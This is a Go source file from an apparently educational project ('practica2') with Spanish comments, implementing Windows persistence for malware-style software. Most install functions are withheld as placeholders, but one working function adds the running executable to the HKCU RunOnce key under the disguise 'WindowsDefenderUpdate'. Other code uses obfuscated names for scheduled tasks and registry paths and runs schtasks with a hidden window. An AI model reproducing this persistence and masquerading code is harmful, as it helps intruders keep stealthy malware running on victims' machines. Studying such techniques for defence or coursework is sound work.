package utils

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"practica2/config"
	"strings"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

// EstablishPersistence establece 3 métodos de persistencia en el sistema
// 1) Registry Run Key, 2) Startup Folder, 3) Scheduled Task
func EstablishPersistence() error {
	/*
	 * [SECURITY PLACEHOLDER]
	 * The actual implementation of the persistence mechanisms has been withheld 
	 * from this public repository for security and responsibility reasons.
	 */
	return nil
}

// addRegistryRunKey añade el ejecutable a HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
func addRegistryRunKey() error {
	/* [SECURITY PLACEHOLDER] - Withheld for safety */
	return nil
}

// addRegistryRunOnceKey añade el ejecutable a HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
func addRegistryRunOnceKey() error {
	exePath, err := getExecutablePath()
	if err != nil {
		return err
	}

	key, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\RunOnce`,
		registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("error abriendo clave de registro: %v", err)
	}
	defer key.Close()

	// Nombre de la entrada
	valueName := "WindowsDefenderUpdate"
	if err := key.SetStringValue(valueName, exePath); err != nil {
		return fmt.Errorf("error estableciendo valor: %v", err)
	}

	config.DebugPrint("    [*] Añadido a RunOnce: %s = %s\n", valueName, exePath)
	return nil
}

// addStartupFolder copia el ejecutable a la carpeta de inicio de Windows
func addStartupFolder() error {
	/* [SECURITY PLACEHOLDER] - Withheld for safety */
	return nil
}

// createScheduledTask crea una tarea programada usando schtasks.exe
func createScheduledTask() error {
	/* [SECURITY PLACEHOLDER] - Withheld for safety */
	return nil
}

// RemovePersistence elimina todos los mecanismos de persistencia
func RemovePersistence() error {
	errors := []error{}

	if err := removeRegistryRunKey(); err != nil {
		errors = append(errors, err)
	}

	if err := removeStartupFolder(); err != nil {
		errors = append(errors, err)
	}

	if err := removeScheduledTask(); err != nil {
		errors = append(errors, err)
	}

	config.DebugPrint("[+] Persistencia eliminada (%d errores)\n", len(errors))
	return nil
}

// removeRegistryRunKey elimina la entrada del registro Run
func removeRegistryRunKey() error {
	key, err := registry.OpenKey(registry.CURRENT_USER,
		GetRegistryPath(),
		registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()

	if err := key.DeleteValue(ObfuscatedStrings.RegValueName); err != nil {
		return err
	}

	return nil
}

// removeStartupFolder elimina el archivo de la carpeta de inicio
func removeStartupFolder() error {
	startupPath := os.Getenv("APPDATA") + `\` + GetStartupPath()
	destPath := filepath.Join(startupPath, ObfuscatedStrings.ExeName)

	if err := os.Remove(destPath); err != nil {
		return err
	}

	return nil
}

// removeScheduledTask elimina la tarea programada
func removeScheduledTask() error {
	cmdArgs := fmt.Sprintf(`/Delete /TN "%s" /F`, ObfuscatedStrings.TaskName)

	output, err := executeCommand(ObfuscatedStrings.TaskScheduler+".exe", cmdArgs)
	if err != nil {
		return fmt.Errorf("error eliminando tarea: %v - %s", err, output)
	}

	return nil
}

// FUNCIONES AUXILIARES

// getExecutablePath obtiene la ruta completa del ejecutable actual
func getExecutablePath() (string, error) {
	exePath, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("error obteniendo ruta del ejecutable: %v", err)
	}
	return exePath, nil
}

// copyFile copia un archivo de origen a destino
func copyFile(src, dst string) error {
	// Leer archivo origen
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}

	// Escribir archivo destino
	if err := os.WriteFile(dst, data, 0755); err != nil {
		return err
	}

	return nil
}

// executeCommand ejecuta un comando del sistema y devuelve su salida
func executeCommand(command string, args string) (string, error) {
	// Ejecutar directamente sin cmd.exe intermedio
	// Dividir los argumentos correctamente respetando comillas
	cmd := exec.Command(command)
	cmd.Args = []string{command}

	// Parsear argumentos respetando comillas
	var parts []string
	inQuotes := false
	var current strings.Builder
	for _, r := range args {
		if r == '"' {
			inQuotes = !inQuotes
		} else if r == ' ' && !inQuotes {
			if current.Len() > 0 {
				parts = append(parts, current.String())
				current.Reset()
			}
		} else {
			current.WriteRune(r)
		}
	}
	if current.Len() > 0 {
		parts = append(parts, current.String())
	}

	cmd.Args = append(cmd.Args, parts...)

	// Ocultar ventana en modo release
	if !config.EnableDebugMode {
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: 0x08000000,
		}
	}

	// Ejecutar comando y capturar salida
	output, err := cmd.CombinedOutput()
	return string(output), err
}

// CheckPersistence verifica qué métodos de persistencia están activos
func CheckPersistence() map[string]bool {
	status := make(map[string]bool)
	status["RegistryRun"] = checkRegistryRunKey()
	status["StartupFolder"] = checkStartupFolder()
	status["ScheduledTask"] = checkScheduledTask()
	return status
}

func checkRegistryRunKey() bool {
	key, err := registry.OpenKey(registry.CURRENT_USER,
		GetRegistryPath(),
		registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer key.Close()

	_, _, err = key.GetStringValue(ObfuscatedStrings.RegValueName)
	return err == nil
}

func checkStartupFolder() bool {
	startupPath := os.Getenv("APPDATA") + `\` + GetStartupPath()
	destPath := filepath.Join(startupPath, ObfuscatedStrings.ExeName)

	_, err := os.Stat(destPath)
	return err == nil
}

func checkScheduledTask() bool {
	cmdArgs := fmt.Sprintf(`/%s /TN "%s"`, ObfuscatedStrings.Query, ObfuscatedStrings.TaskName)
	output, err := executeCommand(ObfuscatedStrings.TaskScheduler+".exe", cmdArgs)
	return err == nil && len(output) > 0
}
